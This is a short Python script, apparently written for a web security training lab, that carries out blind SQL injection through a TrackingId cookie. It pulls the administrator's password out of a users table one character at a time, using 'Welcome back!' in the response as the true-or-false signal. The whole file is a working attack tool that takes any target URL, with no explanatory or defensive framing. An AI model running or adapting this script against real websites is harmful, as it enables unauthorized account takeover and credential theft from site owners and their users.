import requests
import argparse
import string

parser = argparse.ArgumentParser(description='SQL injection exploit script')
parser.add_argument("-u", "--url", type=str, required=True, help='URL of target website')
parser.add_argument("-c", "--cookie", type=str, required=True, help='TrackingId from the cookie header, example: TrackingId=ob9Pn8exUWtLS6tQ')
args = parser.parse_args()

characters = string.ascii_lowercase+'0123456789'

print('Sending requests...')
print('--------------------------------------------------')

password = ''
finished = False
index = 1
while not finished:
    for char in characters:
        headers = {
            'Cookie': f"{args.cookie}'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{index},1)='{char}'--"
        }
        response = requests.get(args.url, headers=headers)
        if b'Welcome back!' in response.content:
            password += char
            print(password, end='\r')
            index += 1
            break
        if char == '9':
            finished = True

print(f'username: administrator\npassword: {password}')